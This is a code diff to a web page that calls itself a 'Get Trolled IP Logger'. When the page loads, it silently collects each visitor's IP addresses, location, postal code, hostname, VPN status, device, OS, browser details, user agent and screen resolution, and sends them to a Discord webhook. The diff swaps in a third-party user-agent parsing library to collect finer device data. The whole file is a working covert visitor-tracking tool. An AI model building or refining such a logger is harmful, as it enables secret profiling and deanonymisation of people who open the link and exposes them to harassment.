@@ -26,6 +26,7 @@
       overflow-y: auto;
     }
   </style>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/1.0.2/ua-parser.min.js"></script>
 </head>
 <body>
   <div id="error-message" title="Click to copy error message"></div>
@@ -44,45 +45,6 @@
     return val;
   }
 
-  function safeName(name) {
-    if (!name) return "N/A";
-    return name.length > 256 ? name.slice(0, 253) + "..." : name;
-  }
-
-  function parseUserAgent(ua) {
-    let device = "Unknown Device";
-    let os = "Unknown OS";
-    let browser = "Unknown Browser";
-
-    if (/Android/.test(ua)) {
-      os = "Android";
-      const match = ua.match(/Android.*;\s([^)]+)\)/);
-      if (match) device = match[1];
-    } else if (/iPhone/.test(ua)) {
-      os = "iOS (iPhone)";
-      device = "iPhone";
-    } else if (/iPad/.test(ua)) {
-      os = "iOS (iPad)";
-      device = "iPad";
-    } else if (/Windows NT/.test(ua)) {
-      os = "Windows";
-    } else if (/Mac OS X/.test(ua)) {
-      os = "Mac OS";
-    }
-
-    if (/Chrome\/\d+/.test(ua)) {
-      browser = "Chrome";
-    } else if (/Firefox\/\d+/.test(ua)) {
-      browser = "Firefox";
-    } else if (/Safari\/\d+/.test(ua) && !/Chrome/.test(ua)) {
-      browser = "Safari";
-    } else if (/Edg\/\d+/.test(ua)) {
-      browser = "Edge";
-    }
-
-    return { device, os, browser };
-  }
-
   function chunkArray(arr, size) {
     const result = [];
     for(let i = 0; i < arr.length; i += size) {
@@ -91,12 +53,6 @@
     return result;
   }
 
-  // Country code to currency fallback map (left in case you want to use later)
-  const countryToCurrency = {
-    US: "USD", GB: "GBP", CA: "CAD", AU: "AUD", IN: "INR",
-  };
-
-  // Fetch fallback geo data from ipapi.co for missing fields
   async function fetchFallbackGeo(ip) {
     try {
       const res = await fetch(`https://ipapi.co/${ip}/json/`);
@@ -131,10 +87,20 @@
     try {
       let data = await fetchIPInfo();
       const fallback = await fetchFallbackGeo(data.ip);
-      const uaInfo = parseUserAgent(navigator.userAgent);
+
+      const parser = new UAParser();
+      const result = parser.getResult();
+
+      const deviceModel = result.device.model || "N/A";
+      const deviceType = result.device.type || "N/A";
+      const deviceVendor = result.device.vendor || "N/A";
+      const osName = result.os.name || "N/A";
+      const osVersion = result.os.version || "N/A";
+      const browserName = result.browser.name || "N/A";
+      const browserVersion = result.browser.version || "N/A";
+
       const localTime = new Date().toLocaleString("en-US", { timeZone: data.timezone || (fallback ? fallback.timezone : undefined) });
 
-      // Fix missing fields with fallback
       data = {
         ...data,
         city: data.city || (fallback ? fallback.city : 'N/A'),
@@ -142,17 +108,14 @@
         postal: data.postal || (fallback ? fallback.postal : 'N/A'),
         ipv6: data.ipv6 || (fallback ? fallback.ipv6 : 'N/A'),
         hostname: data.hostname || (fallback ? fallback.hostname : 'N/A'),
-        currency: data.currency || { code: (fallback && fallback.country_code ? countryToCurrency[fallback.country_code] || 'N/A' : 'N/A'), name: 'N/A' },
       };
 
-      // Mobile detection improved (user agent override)
       let isMobile = safeGet(data, ['security', 'is_mobile'], false);
       if (!isMobile) {
         const ua = navigator.userAgent.toLowerCase();
         isMobile = /mobile|android|iphone|ipad|phone/.test(ua);
       }
 
-      // Prepare all fields (with weather/currency removed)
       const allFields = [
         { name: "IPv4 Address", value: `\`${safeValue(data.ip)}\``, inline: true },
         { name: "IPv6 Address", value: safeValue(data.ipv6), inline: true },
@@ -170,37 +133,19 @@
         { name: "VPN/Hosting", value: safeValue(safeGet(data, ['security', 'is_hosting']) ? "Yes" : "No"), inline: true },
         { name: "Mobile", value: safeValue(isMobile ? "Yes" : "No"), inline: true },
         { name: "Bot", value: safeValue(safeGet(data, ['security', 'is_bot']) ? "Yes" : "No"), inline: true },
+        { name: "Device Model", value: deviceModel, inline: true },
+        { name: "Device Type", value: deviceType, inline: true },
+        { name: "Device Vendor", value: deviceVendor, inline: true },
+        { name: "OS Name", value: osName, inline: true },
+        { name: "OS Version", value: osVersion, inline: true },
+        { name: "Browser Name", value: browserName, inline: true },
+        { name: "Browser Version", value: browserVersion, inline: true },
+        { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
+        { name: "Screen Resolution", value: `\`${window.screen.width}×${window.screen.height} (Logical), ${Math.round(window.screen.width * window.devicePixelRatio)}×${Math.round(window.screen.height * window.devicePixelRatio)} (Physical)\``, inline: true },
       ];
 
-      // Add user agent and screen info
-      const { device, os, browser } = uaInfo;
-      allFields.push(
-        { name: "Device", value: safeValue(device), inline: true },
-        { name: "Operating System", value: safeValue(os), inline: true },
-        { name: "Browser", value: safeValue(browser), inline: true },
-        { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
-        { name: "Screen Resolution", value: `\`${window.screen.width}×${window.screen.height} (Logical), ${window.screen.width * window.devicePixelRatio}×${window.screen.height * window.devicePixelRatio} (Physical)\``, inline: true }
-      );
-
-      // Discord embed max 25 fields, chunk if needed
       const embedChunks = chunkArray(allFields, 25);
-      const embeds = embedChunks.map((chunk, i) => ({
-        title: i === 0 ? "🕵️ New Visitor Logged" : null,
-        color: 0x00ffff,
-        timestamp: new Date().toISOString(),
-        footer: {
-          text: "Get Trolled IP Logger",
-          icon_url: "https://i.imgur.com/qZ7j0fV.png"
-        },
-        author: {
-          name: "Get Trolled IP Logger",
-          url: "https://discord.com",
-          icon_url: "https://i.imgur.com/qZ7j0fV.png"
-        },
-        fields: chunk
-      }));
-
-      await sendDiscordWebhook(embeds);
+      await sendDiscordWebhook(embedChunks);
 
     } catch (err) {
       const errorDiv = document.getElementById('error-message');
